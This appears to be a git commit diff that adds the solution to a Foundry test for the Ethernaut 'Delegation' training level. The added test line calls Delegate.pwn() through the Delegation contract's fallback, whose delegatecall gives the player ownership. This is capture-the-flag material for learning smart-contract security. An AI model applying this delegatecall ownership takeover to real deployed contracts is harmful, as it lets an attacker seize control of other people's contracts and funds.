fe2050181d585ba5a1f0d219b1d1816fd2928b84
lizengping <lizengping93@gmail.com>
2026-04-21 16:42:51 +0800

    Delegation
    the delegate change delegation storage

--- contracts/test/levels/Delegation.t.sol
+++ contracts/test/levels/Delegation.t.sol
@@ -4,12 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
+import {Delegation, Delegate} from "src/levels/Delegation.sol";
 import {DelegationFactory} from "src/levels/DelegationFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {Address} from "openzeppelin-contracts-v5.4.0/utils/Address.sol";
 
 contract TestDelegation is Test, Utils {
+    using Address for address;
     Ethernaut ethernaut;
     Delegation instance;
 
@@ -58,6 +60,6 @@ contract TestDelegation is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        address(instance).functionCall(abi.encodeCall(Delegate.pwn, ()));
     }
 }
